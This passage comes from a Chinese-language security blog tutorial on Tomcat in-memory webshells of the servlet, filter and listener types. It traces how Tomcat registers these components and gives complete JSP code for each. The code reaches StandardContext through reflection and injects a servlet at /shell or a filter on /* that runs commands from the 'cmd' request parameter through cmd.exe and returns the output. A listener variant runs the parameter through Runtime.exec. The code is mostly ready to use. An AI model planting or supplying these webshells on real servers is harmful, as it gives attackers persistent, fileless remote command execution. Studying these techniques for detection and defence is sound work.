Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br><span class="hljs-comment">//动态注册</span><br>    <span class="hljs-comment">//1.获取standardContext</span><br>        <span class="hljs-comment">//获取ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//获取StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>    <span class="hljs-comment">//2.获取wrapper然后添加</span><br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>    wrapper.setServletClass(TestShell.class.getName());<br>        <span class="hljs-comment">//应对懒加载添加我们的实例化servlet</span><br>    wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br>    <span class="hljs-comment">//3.将wrapper添加进standardContext</span><br>    standardContext.addChild(wrapper);<br>    <span class="hljs-comment">//4.添加映射</span><br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.clown2024.cn/202409161818833.png" alt="image-20240916181846766"></p>
<p><img src="https://cdn.clown2024.cn/202409161819095.png" alt="image-20240916181903999"></p>
<p>然后成功白屏弹计算器😋</p>
<p>而我们前面的demo我是直接用的文章里的，他这里就是用了一个随机路径和随机文件名的方式注册，然后直接用匿名类的形式进行实现化，然后直接将命令结果打印出来到网页</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(output);<br>            out.flush();<br>            out.close();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>他这里使用<code>cmd /c</code>来实现可以执行带有空格的命令，例如<code>echo 世界，你好！</code>；对于Linux系统，那就是<code>/bin/sh -c</code></p>
<blockquote>
<p>至于LoadOnStartUp这个玩意没发现他的作用暂时</p>
</blockquote>
<p><strong>关于实例化servlet的添加</strong></p>
<p>因为懒加载机制我们是在访问后才进行的实例化servlet，然后我就想探究一下这个servlet到底是在哪里被实例化然后添加到wrapper里面，但我调了很久也没有发现放进wrapper的地方</p>
<p><img src="https://cdn.clown2024.cn/202409192045616.png" alt="image-20240919204457080"></p>
<p>我这里找到的调用StandardWrapper#allocate()来实例化一个servlet，然后往下有个createFilterChain函数，他将servlet传递了进去，我就去看了一下</p>
<p><img src="https://cdn.clown2024.cn/202409192050093.png" alt="image-20240919205001955"></p>
<p>然后只有这里是将实例添加进了filterchain，此时我还是没看到如exp里面的要将servlet放进wrapper里面</p>
<p><img src="https://cdn.clown2024.cn/202409192054750.png" alt="image-20240919205426641"></p>
<p>最后执行到servlet的时候就是在doFilter方法里面调用servlet属性的service方法，然后到servlet的doGet方法里了</p>
<p>后来终于想通了，看代码太不细致还是漏了关键的地方，我在访问内存马页面之后再调试回到那个allocate方法里面，发现我们设置了实例之后他的判断逻辑就不同了</p>
<p><img src="https://cdn.clown2024.cn/202409192108171.png" alt="image-20240919210819062"></p>
<p>因为我们设置了instance，这部分的逻辑就被跳过了，然后就会到下面这里</p>
<p><img src="https://cdn.clown2024.cn/202409192109478.png" alt="image-20240919210910379"></p>
<p>直接返回我们设置的instance，然后再放进了filterchain里面，这就是为什么我们需要用wrapper.setServlet方法的原因</p>
<p>所以其实我在想如果能够获取filterChain的话直接添加效果应该也是一样的</p>
<h1 id="filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h1><p>这部分参考文章：<a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/%EF%BC%8Chttps://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/，https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>
<p>写Filter内存马的步骤：</p>
<ul>
<li>获取StandardContext；</li>
<li>继承并编写一个恶意filter；</li>
<li>实例化一个FilterDef类，包装filter并存放到<code>StandardContext.filterDefs</code>中；</li>
<li>实例化一个FilterMap类，将我们的Filter和urlpattern相对应，使用addFilterMapBefore存放到StandardContext.filterMaps中；</li>
<li>通过反射获取filterConfigs，实例化一个<code>FilterConfig</code>（<code>ApplicationFilterConfig</code>）类，传入<code>StandardContext</code>与<code>filterDefs</code>，存放到filterConfig中。</li>
</ul>
<p>有关filter相关的内容可以看一下里面文章的总结。</p>
<h2 id="原理分析"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>这里开始先分析再写</p>
<p>filter我们知道就是servlet前的一个过滤器，所以我们只要实现一个filter并写恶意代码，然后添加进去即可</p>
<p><strong>了解一下有关filter的各个名词</strong></p>
<ul>
<li>FilterDefs：首先，需要定义过滤器FilterDef，存放这些FilterDef的数组被称为FilterDefs，每个FilterDef定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及class等。</li>
<li>FilterConfigs：是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求。</li>
<li>FilterMaps：用于将FilterConfigs映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的FilterConfigs。</li>
<li>FilterChain：是由多个FilterConfigs组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照FilterChain中的顺序依次执行每个过滤器，对请求进行过滤和处理。</li>
</ul>
<p><strong>访问网页前的filter添加</strong></p>
<p>同样的filter的添加也在我们之前说到的ContextConfig#configureContext里面</p>
<p><img src="https://cdn.clown2024.cn/202409161922576.png" alt="image-20240916192256483"></p>
<p>这里往context里面添加filterdef，具体代码如下</p>
<p><img src="https://cdn.clown2024.cn/202409161924392.png" alt="image-20240916192439333"></p>
<p>添加到一个hashMap里面，下面是filterDef的相关属性</p>
<p><img src="https://cdn.clown2024.cn/202409192131516.png" alt="image-20240919213120425"></p>
<p>有些属性是我们到时候创建的时候需要设置的</p>
<p><img src="https://cdn.clown2024.cn/202409161925478.png" alt="image-20240916192510416"></p>
<p>这里是添加filterMap进去，再看一下filterMap里相关的属性</p>
<p><img src="https://cdn.clown2024.cn/202409192133213.png" alt="image-20240919213313122"></p>
<p>这就是访问路由前的注册内容</p>
<p><strong>访问之后</strong></p>
<p>现在我们写一个filter类，然后断在doFilter方法，看一下执行的过程</p>
<blockquote>
<p>这里的chain.doFilter是一定要写的不然就走不到servlet那里了，因为遍历doFilter之后，最终是在servletService()方法中走到request</p>
</blockquote>
<p><img src="https://cdn.clown2024.cn/202409192135120.png" alt="image-20240919213506978"></p>
<p>观察一下他的调用栈，可以看到是从StandardWrapperValve#invoke过来的，我们去看一下</p>
<p><img src="https://cdn.clown2024.cn/202409170050633.png" alt="image-20240917005012554"></p>
<p>所以可以知道是在filterChain的doFilter方法里面执行我们的filter和servlet</p>
<p>然后在找一下filterChain是在哪创建的</p>
<p><img src="https://cdn.clown2024.cn/202409170052061.png" alt="image-20240917005252976"></p>
<p>可以看到是在这里，接下来重新下断点到这，看一下filterChain的创建</p>
<p><img src="https://cdn.clown2024.cn/202409192140374.png" alt="image-20240919214048265"></p>
<p>这里先创建了一个ApplicationFilterChain然后看能否从req中获取filterChain，不能就新建一个ApplicationFilterChain同时set给req，继续往下</p>
<p><img src="https://cdn.clown2024.cn/202409170101254.png" alt="image-20240917010128142"></p>
<p>然后就是获取standardContext再从中获取filterMaps，然后看一下现在filterMaps里面的内容</p>
<p><img src="https://cdn.clown2024.cn/202409192144379.png" alt="image-20240919214407244"></p>
<p>可以看到有有我们自己的那个FilterMap</p>
<p><img src="https://cdn.clown2024.cn/202409170106138.png" alt="image-20240917010647039"></p>
<p>接下来会遍历filterMaps 中的 filterMap的filterName，如果发现符合当前请求 url 与 filterMap 中的 urlPattern 匹配且通过filterName能找到对应的filterConfig，则会将其加入filterChain</p>
<p>那来看一下ApplicationFilterConfig的创建</p>
<p><img src="https://cdn.clown2024.cn/202409192148887.png" alt="image-20240919214844764"></p>
<p>可以看到从StandardContext的filterConfigs里面直接根据key获取ApplicationFilterConfig的实例</p>
<p>最后看一下filterConfig的内容</p>
<p><img src="https://cdn.clown2024.cn/202409192151525.png" alt="image-20240919215145392"></p>
<p>包含了filter实例和filterDef还有context这几个重要元素，到此filterChain创建完成，然后就是执行前面说的的doFilter方法</p>
<h2 id="内存马编写"><a href="#内存马编写" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>前面分析可知，最重要的两个方法是**StandardContext.findFilterMaps()<strong>和</strong>StandardContext.findFilterConfig()**，我们只要往这2个属性里面插入对应的filterMap和filterConfig即可实现动态添加filter的目的，这些属性都在standardContext里面，那么standardContext里面是否也有添加这些属性的方法呢</p>
<p>这里standardContext提供了添加filterMap的方法<strong>addFilterMapBefore</strong></p>
<p><img src="https://cdn.clown2024.cn/202409170136347.png" alt="image-20240917013619268"></p>
<p>这里会先校验，然后再添加filterMap，跟进一下validateFilterMap方法</p>
<p><img src="https://cdn.clown2024.cn/202409170138616.png" alt="image-20240917013804538"></p>
<p>可以看到它会根据filterName去寻找对应的filterDef，如果没找到的话会直接抛出异常，也就是说我们还需要往filterDefs里添加filterDef。</p>
<p>关于filterDefs，StandardContext也直接提供了对应的添加方法addFilterDef</p>
<p><img src="https://cdn.clown2024.cn/202409170140748.png" alt="image-20240917014031687"></p>
<p>最后filterConfig并没有添加该属性的方法，需要我们通过反射获取属性进行修改</p>
<p><img src="https://cdn.clown2024.cn/202409170142816.png" alt="image-20240917014218759"></p>
<p>现在大部分的问题我们都解决了</p>
<p>下面是具体的代码实现</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br><br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">// 获取StandardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br><br>    <span class="hljs-comment">// 创建一个filter实例</span><br>    Filter evilFilter=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                <span class="hljs-comment">//将命令回显写入到response里面去</span><br>                response.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len));<br>                process.destroy();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">//去执行doFilter方法</span><br>            chain.doFilter(request,response);<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">// FilterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterDef.setFilterClass(evilFilter.getClass().getName());<br>    <span class="hljs-comment">//这里估计也是在实例化filter的时候如果filterDef设置了就直接返回filter，因为调试的时候filterDef里面正常也是没有filter实例的</span><br>    filterDef.setFilter(evilFilter);<br>    <span class="hljs-comment">//添加FilterDef</span><br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">// FilterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    <span class="hljs-comment">//添加FilterMap</span><br>    standardContext.addFilterMapBefore(filterMap);<br><br>    <span class="hljs-comment">// 获取filterConfigs</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-comment">//创建ApplicationFilterConfig</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<span class="hljs-comment">//将context和filterDef添加进去</span><br>    filterConfigs.put(<span class="hljs-string">&quot;clown&quot;</span>,filterConfig);<br><br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br><br><br><br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.clown2024.cn/202409170203799.png" alt="image-20240917020309726"></p>
<p><img src="https://cdn.clown2024.cn/202409192246438.png" alt="image-20240919224412807"></p>
<p>成功！</p>
<blockquote>
<p>还有exp中的这行代码filterMap.setDispatcher(DispatcherType.REQUEST.name());</p>
<p>我搜了一下它是定义了过滤器可以介入的几种请求类型。这些类型包括：</p>
<ul>
<li><code>REQUEST</code>：普通的客户端请求。</li>
<li><code>FORWARD</code>：通过 <code>RequestDispatcher</code> 转发的请求。</li>
<li><code>INCLUDE</code>：通过 JSP 包含指令包含的资源。</li>
<li><code>ERROR</code>：作为错误页面请求。</li>
</ul>
<p>所以这行代码不是必须的，删掉也一样可以</p>
<p>而且这行代码只支持Tomcat 7.x 以上，因为javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</p>
</blockquote>
<h1 id="listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h1><p>listener就是事件监听，java有很多中listener</p>
<p><img src="https://cdn.clown2024.cn/202409182314209.png" alt="image-20240918230547084"></p>
<p>大都是继承自EventListener接口，这里用ServletRequestListener，他有下面的两个方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.void requestInitialized(ServletRequestEvent sre)：<br>这个方法在 Servlet 请求对象被创建并且还没有被使用之前被调用。这通常发生在一个 HTTP 请求到达 Servlet 容器，并且容器决定为该请求创建一个新的 ServletRequest 对象时。这个方法可以用来初始化请求相关的资源，比如设置请求属性或者启动跟踪请求状态的逻辑。<br><br>2.void requestDestroyed(ServletRequestEvent sre)：<br>这个方法在 Servlet 请求对象即将被销毁时被调用。这通常发生在请求处理完成，响应已经发送给客户端之后。这个方法可以用来清理请求相关的资源，比如关闭数据库连接或者清理在 requestInitialized 方法中创建的任何对象。<br></code></pre></td></tr></table></figure>

<p>可以写一个简单的demo测试一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenerTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Listener 调用&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;servlet 离开&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>配置web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.clown.servletshell.ListenerTest<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>接下来就是照常分析一下Listener是怎么注册的了</p>
<p>这里直接从<strong>ContextConfig#configureContext</strong>那里开始分析，也就是访问前的过程</p>
<p>那就再去读取web.xml的那个地方看看</p>
<p><img src="https://cdn.clown2024.cn/202409191119893.png" alt="image-20240919111941724"></p>
<p>可以看到这里在添加filter之后就将listener的全类名进行添加，调用StandardContext#addApplicationListener方法</p>
<p>添加之后他会调用StandardContext#listenerStart</p>
<p><img src="https://cdn.clown2024.cn/202409191139786.png" alt="image-20240919113903688"></p>
<p>然后这里会查找我们添加的listener，到这步的代码比较复杂就不调了，有个数就行</p>
<p><strong>然后我们去访问网页</strong>，看一下请求过来时listener在哪里调用的</p>
<p><img src="https://cdn.clown2024.cn/202409191143445.png" alt="image-20240919114327349"></p>
<p>这里下个断点然后看看调用栈，看哪一个函数最重要</p>
<p><img src="https://cdn.clown2024.cn/202409191144058.png" alt="image-20240919114444926"></p>
<p>最重要的应该是这个函数StandardContext#fireRequestInitEvent</p>
<p>重新将断点下在这里看一看</p>
<p><img src="https://cdn.clown2024.cn/202409191151789.png" alt="image-20240919115146689"></p>
<p>可以看到它接受了request请求参数然后进行相关操作，然后这里获取一个listener数组</p>
<p>我们进该方法看看</p>
<p><img src="https://cdn.clown2024.cn/202409191155718.png" alt="image-20240919115507610"></p>
<p>可以看到applicationEventListenersList里面的就是我们的listener</p>
<p>而且StandardContext还有对应的添加listener的方法如下：</p>
<p><img src="https://cdn.clown2024.cn/202409191156621.png" alt="image-20240919115656529"></p>
<p>然后就是到下面遍历触发我们定义的listener的requestInitialized()方法</p>
<p><img src="https://cdn.clown2024.cn/202409191200195.png" alt="image-20240919120033087"></p>
<p>到这里流程就结束，这部分看起来还是比较简单的</p>
<p>相对应的请求结束的时候就会调用fireRequestDestroyEvent方法</p>
<p><img src="https://cdn.clown2024.cn/202409191232040.png" alt="image-20240919120248808"></p>
<h2 id="内存马编写"><a href="#内存马编写-1" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>通过上面的流程分析，exp的编写步骤也很简单：</p>
<p>就是通过 StandardContext 类的 <code>addApplicationEventListener()</code> 方法把恶意的 Listener实例放进去，然后恶意代码写在requestInitialized()方法里面即可</p>
<p>exp</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//获取standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//创建恶意listener</span><br>    <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">servletRequestListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestListener</span>()&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span 